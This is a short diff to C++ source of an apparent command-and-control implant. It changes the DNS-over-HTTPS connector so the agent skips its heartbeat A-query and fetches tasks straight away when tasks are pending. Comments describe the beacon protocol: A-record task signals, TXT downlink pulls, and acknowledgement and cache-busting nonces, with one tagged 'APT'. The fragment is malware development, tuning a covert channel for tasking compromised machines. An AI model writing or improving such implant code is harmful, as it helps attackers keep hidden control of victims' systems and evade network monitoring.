@@ -1184,13 +1184,14 @@ void ConnectorDoH::SendData(BYTE* data, ULONG data_size)
 	// -------------------------------------------------------------------------
 	// 4. Normal GET: heartbeat + downlink pull.
 	// -------------------------------------------------------------------------
-	// Heartbeat A-query when there is no in-progress downlink buffer. This
-	// mirrors ConnectorDNS::SendData hybrid A/TXT behavior:
+	// Heartbeat A-query when there is no in-progress downlink buffer AND no pending tasks.
+	// This mirrors ConnectorDNS::SendData hybrid A/TXT behavior:
 	//  - A(0.0.0.0) -> no tasks, return and let AgentMain sleep
-	//  - A(0.0.0.1) -> has tasks, fall through to TXT GET below
+	//  - A(0.0.0.1) -> has tasks, set hasPendingTasks and return to trigger burst
+	// If hasPendingTasks=TRUE, skip heartbeat and go directly to GET logic.
 	// ACK mechanism: encode downAckOffset and downTaskNonce to tell server which task/offset is confirmed.
 	// HB data format: [ackOffset:4][hbNonce:4][ackTaskNonce:4] = 12 bytes
-	if (!this->downBuf) {
+	if (!this->downBuf && !this->hasPendingTasks) {
 		CHAR qnameA[512];
 		// APT: Include ack_offset, hbNonce (cache bust), and ackTaskNonce (to identify which task is being ACKed)
 		ULONG hbNonce = GetTickCount() ^ (this->seq * 7919);
